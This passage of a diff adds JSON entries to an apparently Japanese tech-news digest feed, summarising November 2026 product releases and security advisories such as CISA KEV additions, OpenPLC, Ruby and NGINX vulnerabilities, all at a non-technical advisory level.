+        "after": "エージェントが文脈化されたオブジェクトを扱う"
+      },
+      "scope": [],
+      "summary": "Google Cloudがobject enrichmentsを導入。画像、PDF、動画、音声などの非構造化データを、AIエージェントが利用できる文脈へ変換する。",
+      "title": "Introducing object enrichments: Transform unstructured data into agent-ready context",
+      "url": "https://cloud.google.com/blog/products/storage-data-transfer/cost-effective-ai-context-extraction-from-unstructured-gcs-data/",
+      "sourceLabel": "Google Cloud Blog",
+      "publishedAt": "2026-11-19T17:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "12f54397445c9205",
+      "product": "Gemini for Google Cloud partners",
+      "what": "パートナー向けGeminiマーケティング機能",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "ブランドに沿った共同マーケティング素材を短時間で作成できるようになる",
+      "change": {
+        "before": "共同マーケティング素材を手作業で作成",
+        "after": "Geminiでブランド準拠の素材を自動作成"
+      },
+      "scope": [],
+      "summary": "Google Cloudが、パートナー向けの日常的な販売活動にGemini-powered co-marketing機能を追加。ブランドに沿った共同マーケティング素材を作成できる。",
+      "title": "Helping our partners market smarter, together, with Gemini",
+      "url": "https://cloud.google.com/blog/topics/partners/helping-our-partners-market-smarter-together-with-gemini/",
+      "sourceLabel": "Google Cloud Blog",
+      "publishedAt": "2026-11-19T17:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "14b1a96fab6dd0ea",
+      "product": "GKE Dataplane V2",
+      "what": "GKE向けeBPFネットワークデータプレーン",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "稼働中のGKEクラスターをDataplane V2へ移行できるようになる",
+      "change": {
+        "before": "本番クラスターを停止・再構築して移行",
+        "after": "稼働中のクラスターからDataplane V2へ移行"
+      },
+      "scope": [
+        "GKE"
+      ],
+      "summary": "GKE Dataplane V2へのin-place migrationを導入。既存の本番クラスターを、停止や再構築を避けながら次世代のeBPFベースのデータプレーンへ移行できる。",
+      "title": "Introducing in-place migration to GKE Dataplane V2",
+      "url": "https://cloud.google.com/blog/products/networking/gke-dataplane-v2-in-place-migration/",
+      "sourceLabel": "Google Cloud Blog",
+      "publishedAt": "2026-11-19T17:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "1af7db356c657f0d",
+      "product": "Genie 4",
+      "what": "インタラクティブな世界生成AIモデル",
+      "version": null,
+      "kind": "ai-model",
+      "impact": "unlocks",
+      "unlock": "Gemini APIで音声付き720pのインタラクティブ世界を生成できるようになる",
+      "change": null,
+      "scope": [
+        "Gemini API"
+      ],
+      "summary": "Genie 4がGemini APIで利用可能になった。720pのインタラクティブな世界を生成し、ネイティブ音声とリアルタイム操作に対応する。",
+      "title": "Genie 4 is now available on the Gemini API.",
+      "url": "https://blog.google/innovation-and-ai/technology/developers-tools/genie-4-in-gemini-api/",
+      "sourceLabel": "Google Developers",
+      "publishedAt": "2026-11-19T17:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "7456c067e91f138f",
+      "product": "Cloudflare Vite Plugin",
+      "what": "Cloudflare Workers向けViteプラグイン",
+      "version": "@cloudflare/vite-plugin@1.70.1",
+      "kind": "patch",
+      "impact": "unlocks",
+      "unlock": "ローカルのメールハンドラーで転送可否を検証できるようになる",
+      "change": {
+        "before": "ローカルのメール処理で転送可否を取得できない",
+        "after": "本番同様にcanBeForwardedを取得できる"
+      },
+      "scope": [
+        "ローカル開発"
+      ],
+      "summary": "@cloudflare/vite-plugin@1.70.1で、Vite開発サーバー上のメールハンドラーがcanBeForwardedを公開。本番と同じ転送可否をローカルで検証できる。",
+      "title": "cloudflare/workers-sdk @cloudflare/vite-plugin@1.70.1",
+      "url": "https://github.com/cloudflare/workers-sdk/releases/tag/%40cloudflare/vite-plugin%401.70.1",
+      "sourceLabel": "GitHub Releases / cloudflare/workers-sdk",
+      "publishedAt": "2026-11-19T13:25:50.000Z",
+      "alsoReleased": [],
+      "tryPrompt": "# 試すこと\nCloudflare Vite Plugin @cloudflare/vite-plugin@1.70.1 を入れて、「ローカルのメールハンドラーで転送可否を検証できるようになる」を確かめる\nhttps://github.com/cloudflare/workers-sdk/releases/tag/%40cloudflare/vite-plugin%401.70.1\n\n# 手順\n1. git clone --depth 1 --branch %40cloudflare https://github.com/cloudflare/workers-sdk\n2. cd workers-sdk && ls\n3. README の手順どおりに依存を入れ、最初の出力が出るまで進める\n\n# 確認したいこと\n- @cloudflare/vite-plugin@1.70.1 が実際に入って動くか\n- 「ローカルのメールハンドラーで転送可否を検証できるようになる」を実際に確かめられるか\n- 既存の使い方のまま上げたときに壊れる箇所はあるか\n\n# 前提・注意\n- git が入っていること\n- %40cloudflare のタグを固定して clone している。main が要るなら --branch を外す"
+    },
+    {
+      "id": "6afb762439de266e",
+      "product": "Vercel Billing CLI",
+      "what": "Vercel請求管理用CLI",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "CLIからVercelの請求を扱えるようになる",
+      "change": null,
+      "scope": [
+        "CLI"
+      ],
+      "summary": "Vercel Billing CLIが利用可能になった。Vercelの請求関連操作をコマンドラインから扱える。",
+      "title": "Vercel Billing CLI is now available",
+      "url": "https://vercel.com/changelog/vercel-billing-cli-is-now-available",
+      "sourceLabel": "Vercel Changelog",
+      "publishedAt": "2026-11-19T05:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "035dfea616859fdd",
+      "product": "Claude Code",
+      "what": "AIコーディングエージェントのCLI",
+      "version": "v2.1.328",
+      "kind": "patch",
+      "impact": "unlocks",
+      "unlock": "対応クラウド上でClaudeのauto modeを使えるようになる",
+      "change": null,
+      "scope": [
+        "Amazon Bedrock",
+        "Google Cloud's Agent Platform",
+        "Microsoft Foundry",
+        "Claude apps gateway"
+      ],
+      "summary": "Claude Code v2.1.328で、Claude Opus 4.6／Sonnet 4.6向けauto modeを追加。MCPツールフックの失敗時に処理をブロックするonFailureも対応した。",
+      "title": "anthropics/claude-code v2.1.328",
+      "url": "https://github.com/anthropics/claude-code/releases/tag/v2.1.328",
+      "sourceLabel": "GitHub Releases / anthropics/claude-code",
+      "publishedAt": "2026-11-19T01:14:04.000Z",
+      "alsoReleased": [],
+      "tryPrompt": "# 試すこと\nClaude Code v2.1.328 を入れて、「対応クラウド上でClaudeのauto modeを使えるようになる」を確かめる\nhttps://github.com/anthropics/claude-code/releases/tag/v2.1.328\n\n# 手順\n1. git clone --depth 1 --branch v2.1.328 https://github.com/anthropics/claude-code\n2. cd claude-code && ls\n3. README の手順どおりに依存を入れ、最初の出力が出るまで進める\n\n# 確認したいこと\n- v2.1.328 が実際に入って動くか\n- 「対応クラウド上でClaudeのauto modeを使えるようになる」を実際に確かめられるか\n- 既存の使い方のまま上げたときに壊れる箇所はあるか\n\n# 前提・注意\n- git が入っていること\n- v2.1.328 のタグを固定して clone している。main が要るなら --branch を外す"
+    },
+    {
+      "id": "b8b65b00c30d3190",
+      "product": "Claude Agent SDK for TypeScript",
+      "what": "Claudeエージェント構築用TypeScript SDK",
+      "version": "v0.3.328",
+      "kind": "patch",
+      "impact": "unlocks",
+      "unlock": "失敗時にMCPツールフックでアクションをブロックできるようになる",
+      "change": null,
+      "scope": [],
+      "summary": "Claude Agent SDK v0.3.328で、MCPツールフックのonFailureと、延期されたツール再開を止める環境変数を追加。管理設定のallowManagedModsOnlyにも対応した。",
+      "title": "anthropics/claude-agent-sdk-typescript v0.3.328",
+      "url": "https://github.com/anthropics/claude-agent-sdk-typescript/releases/tag/v0.3.328",
+      "sourceLabel": "GitHub Releases / anthropics/claude-agent-sdk-typescript",
+      "publishedAt": "2026-11-19T01:14:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": "# 試すこと\nClaude Agent SDK for TypeScript v0.3.328 を入れて、「失敗時にMCPツールフックでアクションをブロックできるようになる」を確かめる\nhttps://github.com/anthropics/claude-agent-sdk-typescript/releases/tag/v0.3.328\n\n# 手順\n1. git clone --depth 1 --branch v0.3.328 https://github.com/anthropics/claude-agent-sdk-typescript\n2. cd claude-agent-sdk-typescript && ls\n3. README の手順どおりに依存を入れ、最初の出力が出るまで進める\n\n# 確認したいこと\n- v0.3.328 が実際に入って動くか\n- 「失敗時にMCPツールフックでアクションをブロックできるようになる」を実際に確かめられるか\n- 既存の使い方のまま上げたときに壊れる箇所はあるか\n\n# 前提・注意\n- git が入っていること\n- v0.3.328 のタグを固定して clone している。main が要るなら --branch を外す"
+    },
+    {
+      "id": "a262b481692faf30",
+      "product": "GitHub CLI",
+      "what": "GitHub操作用コマンドラインツール",
+      "version": "v2.105.0",
+      "kind": "minor",
+      "impact": "unlocks",
+      "unlock": "プルリクエストの変更をポーリングなしで待機できるようになる",
+      "change": {
+        "before": "ループでプルリクエストをポーリング",
+        "after": "gh event listenでイベントを購読して待機"
+      },
+      "scope": [
+        "CLI"
+      ],
+      "summary": "GitHub CLI v2.105.0でGitHub Event Streamsに対応。gh event listenにより、プルリクエストのレビュー提出などをJSONイベントとして待機・取得できる。",
+      "title": "Wait for pull request events with GitHub CLI",
+      "url": "https://github.blog/changelog/2026-11-18-wait-for-pull-request-events-with-github-cli",
+      "sourceLabel": "GitHub Changelog",
+      "publishedAt": "2026-11-19T00:00:13.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "2748f18871ec78e2",
+      "product": "Vercel AI Gateway",
+      "what": "複数AIモデルへの統合ゲートウェイ",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "AI GatewayからLiquid AIのd1.2系モデルを利用できるようになる",
+      "change": {
+        "before": "AI GatewayでLiquid AI d1.2系を利用できない",
+        "after": "AI Gatewayでd1.2とd1.2-ultraを利用できる"
+      },
+      "scope": [],
+      "summary": "Liquid AIのd1.2とd1.2-ultraがVercel AI Gatewayで利用可能になった。",
+      "title": "Liquid AI's d1.2 and d1.2-ultra are now available on AI Gateway",
+      "url": "https://vercel.com/changelog/liquid-ais-d1-2-and-d1-2-ultra-are-now-available-on-ai-gateway",
+      "sourceLabel": "Vercel Changelog",
+      "publishedAt": "2026-11-19T00:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "039fefb676644083",
+      "product": "GitHub Copilot",
+      "what": "AIコーディング支援サービス",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "BoxやCalendlyなど8サービスをCopilotへ接続できるようになる",
+      "change": {
+        "before": "Copilotから接続できるサービスが限定的",
+        "after": "GitHub検証済みMCPサーバーで8サービスを追加接続"
+      },
+      "scope": [],
+      "summary": "GitHub Copilotに、GitHub検証済みMCPサーバー経由でBox、Buildkite、Calendly、ClickUpなど8サービスを接続できる機能をパブリックプレビューで追加した。",
+      "title": "Connect Supabase, Box, Calendly, and more to Copilot",
+      "url": "https://github.blog/changelog/2026-11-18-connect-supabase-box-calendly-and-more-to-copilot",
+      "sourceLabel": "GitHub Changelog",
+      "publishedAt": "2026-11-18T22:04:50.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "a559e874d5b81c8d",
+      "product": "Clairic / Clairic-flash",
+      "what": "Cloudflare Workers AIの文書理解モデル",
+      "version": null,
+      "kind": "ai-model",
+      "impact": "unlocks",
+      "unlock": "画像やPDFを含む複雑な文書をより正確に抽出・回答できるようになる",
+      "change": {
+        "before": "複雑な文書の抽出と根拠付けに制約",
+        "after": "表・リスト・日付を含む文書を高精度に抽出"
+      },
+      "scope": [],
+      "summary": "Cloudflareがopen-weightモデルのClairic更新版と、軽量・高速なClairic-flashを公開。画像やPDF、表・リスト・日付の抽出と回答の根拠付けを改善した。",
+      "title": "An updated Clairic and Clairic-flash are now open-weight, from the new Workers AI Superintelligence team",
+      "url": "https://blog.cloudflare.com/open-clairic/",
+      "sourceLabel": "Cloudflare Blog",
+      "publishedAt": "2026-11-18T22:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "4b5839f7c6df9238",
+      "product": "Bun",
+      "what": "JavaScript／TypeScriptランタイム",
+      "version": "v1.4.5",
+      "kind": "patch",
+      "impact": "chore",
+      "unlock": null,
+      "change": null,
+      "scope": [],
+      "summary": "Bun v1.4.5が公開された。提示された抜粋では、具体的な変更内容は示されていない。",
+      "title": "oven-sh/bun Bun v1.4.5",
+      "url": "https://github.com/oven-sh/bun/releases/tag/bun-v1.4.5",
+      "sourceLabel": "GitHub Releases / oven-sh/bun",
+      "publishedAt": "2026-11-19T08:47:28.000Z",
+      "alsoReleased": [],
+      "tryPrompt": "# 試すこと\nBun v1.4.5 を入れて、この版の変更を確かめる\nhttps://github.com/oven-sh/bun/releases/tag/bun-v1.4.5\n\n# 手順\n1. git clone --depth 1 --branch bun-v1.4.5 https://github.com/oven-sh/bun\n2. cd bun && ls\n3. README の手順どおりに依存を入れ、最初の出力が出るまで進める\n\n# 確認したいこと\n- v1.4.5 が実際に入って動くか\n- リリースノートに書かれた変更を実際に確かめられるか\n- 既存の使い方のまま上げたときに壊れる箇所はあるか\n\n# 前提・注意\n- git が入っていること\n- bun-v1.4.5 のタグを固定して clone している。main が要るなら --branch を外す"
+    }
+  ],
+  "others": [
+    {
+      "source": "rss",
+      "sourceLabel": "The Hacker News",
+      "title": "CISA Warns of 4 Exploited Flaws Linked to Ransomware, Cryptomining, and LLMjacking Attacks",
+      "url": "https://thehackernews.com/2026/11/cisa-warns-of-4-exploited-flaws-linked.html",
+      "publishedAt": "2026-11-19T08:00:00.000Z",
+      "author": "info@thehackernews.com (The Hacker News)",
+      "authorDetail": {
+        "name": "info@thehackernews.com (The Hacker News)"
+      },
+      "tags": [],
+      "snippet": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added four vulnerabilities impacting Synology DiskStation Manager (DSM), BerriAI LiteLLM, Apache Axis, and Vanderbilt University Research Electronic Data Capture (REDCap) to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerabilities are listed below -",
+      "metrics": {},
+      "sourceWeight": 3,
+      "feedCategory": "security",
+      "id": "28cef155529d577e",
+      "lang": "en",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.7000000000000001,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [
+        "クラウド / 本番環境構築"
+      ],
+      "buzz": false,
+      "score": 84,
+      "titleJa": "ランサムウェアや暗号資産採掘で悪用された4脆弱性",
+      "oneLiner": "CISAが実際の攻撃で悪用された4件の脆弱性をKEVカタログに追加した。",
+      "takeaways": [
+        "米国当局が攻撃に使われた4件の欠陥を公開した。",
+        "対象は保存装置やAIサービスなど四つの製品だった。",
+        "攻撃者は身代金要求や暗号資産採掘に利用していた。"
+      ],
+      "keywords": [
+        "CISA",
+        "KEV",
+        "Synology DSM",
+        "BerriAI LiteLLM",
+        "Apache Axis",
+        "REDCap"
+      ],
+      "category": "調査・考察",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 3,
+      "payoff": "aware",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "CISA Advisories",
+      "title": "Autonomy Logic OpenPLC Runtime",
+      "url": "https://www.cisa.gov/news-events/ics-advisories/icsa-26-323-01",
+      "publishedAt": "2026-11-19T12:00:00.000Z",
+      "author": "CISA",
+      "authorDetail": {
+        "name": "CISA"
+      },
+      "tags": [],
+      "snippet": "View CSAF Summary Successful exploitation of this vulnerability could allow several unauthenticated admin accounts to be created. The following versions of Autonomy Logic OpenPLC Runtime are affected: OpenPLC Runtime <=4.2.4 (CVE-2026-126088) CVSS Vendor Equipment v3 8.1 Autonomy Logic OpenPLC Runtime 1 Vulnerability Concurrent Execution using Shared Resource with Improper Synchronization ('Race C…",
+      "body": "View CSAF \n\n Summary\n\n Successful exploitation of this vulnerability could allow several unauthenticated admin accounts to be created. \n\n The following versions of Autonomy Logic OpenPLC Runtime are affected:\n\n \n OpenPLC Runtime <=4.2.4 (CVE-2026-126088)\n\n \n \n \n \n \n CVSS \n Vendor \n Equipment \n\n \n \n \n v3 8.1 \n Autonomy Logic \n OpenPLC Runtime \n\n \n \n \n \n \n 1 Vulnerability \n\n \n \n \n Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') \n\n \n \n\n Background\n\n \n Critical Infrastructure Sectors: Critical Manufacturing, Energy, Transportation Systems, Water and Wastewater Systems\n\n Countries/Areas Deployed: Worldwide\n\n Company Headquarters Location: United States\n\n \n \n Vulnerabilities\n\n \n CVE-2026-126088\n\n In Autonomy Logic OpenPLC Runtime versions 4.2.4 and prior, a race condition allows multiple concurrent requests to pass the existence check before any user is committed, resulting in several unauthenticated admin accounts being created.\n\n Read More \n\n \n 1 Affected Product\n\n \n Autonomy Logic OpenPLC Runtime <=4.2.4\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nUpdate to OpenPLC Runtime version 4.3.0 or later.\n\n \n Additional Metrics\n\n Relevant CWE: CWE-362 Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') \n\n \n \n \n \n CVSS Version \n Base Score \n Base Severity \n Vector String \n\n \n \n \n 3.1 \n 8.1 \n HIGH \n CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H \n\n \n 4.0 \n 9.2 \n CRITICAL \n CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N \n\n \n \n\n \n View CVE Details \n\n \n Acknowledgments\n\n \n Noureddin Lutfi reported this vulnerability to CISA.\n\n \n \n Recommended Practices\n\n CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities.\n\n \n Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet .\n\n Locate control system networks and remote devices behind firewalls and isolating them from business networks.\n\n When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.\n\n \n CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.\n\n CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics . Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies .\n\n CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets .\n\n Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies .\n\n Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents.\n\n CISA also recommends users take the following measures to protect themselves from social engineering attacks:\n\n \n Do not click web links or open attachments in unsolicited email messages.\n\n Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams.\n\n Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks.\n\n \n No known public exploitation specifically targeting these vulnerabilities has been reported to CISA at this time.\n\n \n Revision History\n\n \n Initial Release Date: 2026-11-19\n\n \n \n \n \n Date \n Revision \n Summary \n\n \n \n \n 2026-11-19 \n 1 \n Initial Publication \n\n \n \n \n Legal Notice and Terms of Use",
+      "metrics": {},
+      "sourceWeight": 4,
+      "feedCategory": "security",
+      "id": "2213fb5632d99e10",
+      "lang": "en",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.6216666666666667,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [],
+      "buzz": false,
+      "score": 80,
+      "titleJa": "OpenPLC Runtimeで管理者アカウントを作れる脆弱性",
+      "oneLiner": "OpenPLC Runtimeの欠陥により認証なしで複数の管理者アカウントを作成できた。",
+      "takeaways": [
+        "工場や電力設備で使う制御ソフトに欠陥が見つかった。",
+        "認証なしで管理者の入口を複数作れた。",
+        "影響するのは4.2.4以下のバージョンだった。"
+      ],
+      "keywords": [
+        "Autonomy Logic",
+        "OpenPLC Runtime",
+        "CVE-2026-126088",
+        "CISA",
+        "OTセキュリティ"
+      ],
+      "category": "調査・考察",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 3,
+      "payoff": "aware",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "The Hacker News",
+      "title": "Ruby Releases Fixes for 7 Regex and String Flaws, Warns 5 Have Proof-of-Concept RCE",
+      "url": "https://thehackernews.com/2026/11/ruby-releases-fixes-for-7-regex-and.html",
+      "publishedAt": "2026-11-19T08:42:11.000Z",
+      "author": "info@thehackernews.com (The Hacker News)",
+      "authorDetail": {
+        "name": "info@thehackernews.com (The Hacker News)"
+      },
+      "tags": [],
+      "snippet": "Ruby contains seven memory-safety flaws in its regular expression engine and its string case-conversion code. For five of them, its maintainers say, proof-of-concept exploits, or PoCs, have shown that crafted input can run code on the machine. \"We are aware of PoCs that prove some of them can be used to trigger remote code execution,\" the maintainers said. The project released fixed versions",
+      "metrics": {},
+      "sourceWeight": 3,
+      "feedCategory": "security",
+      "id": "c7cac41525492c92",
+      "lang": "en",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.7000000000000001,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [
+        "クラウド / 本番環境構築"
+      ],
+      "buzz": false,
+      "score": 78,
+      "titleJa": "Rubyの正規表現と文字列処理に関する7件の脆弱性修正",
+      "oneLiner": "Rubyが正規表現と文字列処理にある7件のメモリ安全性問題を修正した。",
+      "takeaways": [
+        "Rubyの文字を扱う機能に7件の欠陥が見つかった。",
+        "そのうち5件は細工した入力でコードを動かせた。",
+        "Ruby開発チームは修正版を公開した。"
+      ],
+      "keywords": [
+        "Ruby",
+        "正規表現エンジン",
+        "メモリ安全性",
+        "RCE",
+        "PoC"
+      ],
+      "category": "リリース/アップデート",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 5,
+      "payoff": "apply",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "Security NEXT",
+      "title": "米当局、脆弱性の悪用リストに4件を追加",
+      "url": "https://www.security-next.com/193071",
+      "publishedAt": "2026-11-19T00:17:31.000Z",
+      "author": "snadmin",
+      "authorDetail": {
+        "name": "snadmin"
+      },
+      "tags": [
+        "ガイドライン・資料",
+        "ニュース",
+        "政府・業界動向"
+      ],
+      "snippet": "米当局は、「Apache Axis」「REDCap」「Synology DSM」「LiteLLM」に関する脆弱性が実際の攻撃で悪用されているとして注意を呼びかけた。",
+      "metrics": {},
+      "sourceWeight": 4,
+      "feedCategory": "security",
+      "id": "154dcd308c3dd2f7",
+      "lang": "ja",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.65,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": false,
+      "score": 78,
+      "titleJa": null,
+      "oneLiner": "米当局がApache Axisなど4製品の悪用中の脆弱性を警告した。",
+      "takeaways": [
+        "米当局が攻撃に使われた4件の欠陥を警告した。",
+        "対象には古いJava向け通信ソフトが含まれていた。",
+        "Synology DSMやLiteLLMも対象に追加された。"
+      ],
+      "keywords": [
+        "CISA",
+        "Apache Axis",
+        "REDCap",
+        "Synology DSM",
+        "LiteLLM",
+        "KEV"
+      ],
+      "category": "調査・考察",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 3,
+      "payoff": "aware",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "Security NEXT",
+      "title": "旧版「Apache Axis」に脆弱性、悪用も - 後継版などへ移行を",
+      "url": "https://www.security-next.com/193011",
+      "publishedAt": "2026-11-19T06:18:16.000Z",
+      "author": "snadmin",
+      "authorDetail": {
+        "name": "snadmin"
+      },
+      "tags": [
+        "ニュース",
+        "脆弱性"
+      ],
+      "snippet": "Java向けSOAPエンジン「Apache Axis」のサポートが終了している旧版に深刻な脆弱性が確認された。すでに悪用も確認されており、後継版や他エンジンへの移行が呼びかけられている。",
+      "metrics": {},
+      "sourceWeight": 4,
+      "feedCategory": "security",
+      "id": "a05a37e25a346709",
+      "lang": "ja",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.65,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": false,
+      "score": 78,
+      "titleJa": null,
+      "oneLiner": "サポート終了済みのApache Axisに悪用済みの深刻な脆弱性が見つかった。",
+      "takeaways": [
+        "古いJava向け通信ソフトに深刻な欠陥が見つかった。",
+        "攻撃者がすでにこの欠陥を悪用していた。",
+        "開発元は後継版や別製品への移行を求めている。"
+      ],
+      "keywords": [
+        "Apache Axis",
+        "SOAP",
+        "CISA KEV",
+        "Java",
+        "脆弱性悪用"
+      ],
+      "category": "リリース/アップデート",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 3,
+      "payoff": "decide",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "JPCERT/CC",
+      "title": "お知らせ：CyberNewsFlash「認証を有効にしていないNode-REDに悪意ある制御フローが登録される問題（CVE-2026-58115）について」",
+      "url": "https://www.jpcert.or.jp/newsflash/2026111901.html",
+      "publishedAt": "2026-11-19T02:09:00.000Z",
+      "tags": [],
+      "snippet": "",
+      "metrics": {},
+      "sourceWeight": 5,
+      "feedCategory": "security",
+      "id": "9a7ebdbb46653a39",
+      "lang": "ja",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.685,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": false,
+      "score": 75,
+      "titleJa": null,
+      "oneLiner": "認証を有効にしていないNode-REDへ悪意ある制御フローを登録できる問題が告知された。",
+      "takeaways": [
+        "認証なしのNode-REDに悪意ある処理を登録できた。",
+        "JPCERT/CCがCVE-2026-58115として告知した。",
+        "本文の詳細は提供されていない。"
+      ],
+      "keywords": [
+        "Node-RED",
+        "JPCERT/CC",
+        "CVE-2026-58115",
+        "CyberNewsFlash"
+      ],
+      "category": "調査・考察",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 2,
+      "payoff": "aware",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "hatena",
+      "sourceLabel": "はてなブックマーク",
+      "title": "サーバーソフト「nginx」に脆弱性、日本人ハッカーら発見 - 日本経済新聞",
+      "url": "https://www.nikkei.com/article/DGXZQOUC191DA0Z11C26A1000000/",
+      "publishedAt": "2026-11-19T06:16:47.000Z",
+      "tags": [
+        "テクノロジー",
+        "あとで読む"
+      ],
+      "snippet": "日本のサイトの約6割で使われているとされるサーバーソフト「nginx（エンジンエックス）」に重大な脆弱性があることが19日、わかった。日本のホワイトハッカーや米グーグル傘下企業などが発見した。開発元はサイバー攻撃のおそれがあるとして早期の対応を呼びかけている。エンジンエックスは、インターネット利用者の端...",
+      "metrics": {
+        "hatena": 6
+      },
+      "sourceWeight": 3,
+      "id": "c700c5a329c8d238",
+      "lang": "ja",
+      "foundIn": [
+        "hatena"
+      ],
+      "preScore": 0.374375,
+      "popularityPercentile": 0.15625,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": true,
+      "score": 86,
+      "titleJa": null,
+      "oneLiner": "NGINXに重大な脆弱性が見つかり、開発元がサイバー攻撃を防ぐための早期対応を呼びかけた。",
+      "takeaways": [
+        "広く使われるNGINXに重大な欠陥が見つかった。",
+        "攻撃者が認証を突破して悪用する恐れがある。",
+        "開発元は利用者に早期の対策を呼びかけている。"
+      ],
+      "keywords": [
+        "NGINX",
+        "nginx",
+        "脆弱性",
+        "サイバー攻撃",
+        "Webサーバー"
+      ],
+      "category": "調査・考察",
+      "lane": "know",
+      "readingMinutes": 3,
+      "payoff": "aware",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "hatena",
+      "sourceLabel": "はてなブックマーク",
+      "title": "NGINXの複数の脆弱性対策について（CVE-2026-123007、CVE-2026-123633等） | 情報セキュリティ | IPA 独立行政法人 情報処理推進機構",
+      "url": "https://www.ipa.go.jp/security/security-alert/2026/alert20261119.html",
+      "publishedAt": "2026-11-19T06:49:06.000Z",
+      "tags": [
+        "テクノロジー",
+        "セキュリティ",
+        "あとで読む",
+        "サービス",
+        "security"
+      ],
+      "snippet": "トップページ 情報セキュリティ 重要なセキュリティ情報 2026年度 NGINXの複数の脆弱性対策について（CVE-2026-123007、CVE-2026-123633等） 注釈：追記すべき情報がある場合には、その都度このページを更新する予定です。 概要 F5社が提供するNGINX Open SourceおよびNGINX Plusについて、2026年11月18日に複数の脆弱性...",
+      "metrics": {
+        "hatena": 49
+      },
+      "sourceWeight": 3,
+      "id": "92daa294d3658dbd",
+      "lang": "ja",
+      "foundIn": [
+        "hatena"
+      ],
+      "preScore": 0.505,
+      "popularityPercentile": 0.75,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": true,
+      "score": 84,
+      "titleJa": null,
+      "oneLiner": "IPAがNGINX Open SourceとNGINX Plusの複数脆弱性について、2026年11月18日に注意喚起を更新した。",
+      "takeaways": [
+        "NGINX Open SourceとNGINX Plusに複数の欠陥が見つかった。",
+        "対象製品の利用環境では修正版の確認が必要になる。",
+        "IPAは2026年11月18日に対策情報を公開した。"
+      ],
+      "keywords": [
+        "NGINX Open Source",
+        "NGINX Plus",
+        "CVE-2026-123007",
+        "CVE-2026-123633",
+        "IPA",
+        "F5"
+      ],
+      "category": "リリース/アップデート",
+      "lane": "know",
+      "readingMinutes": 4,
+      "payoff": "apply",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
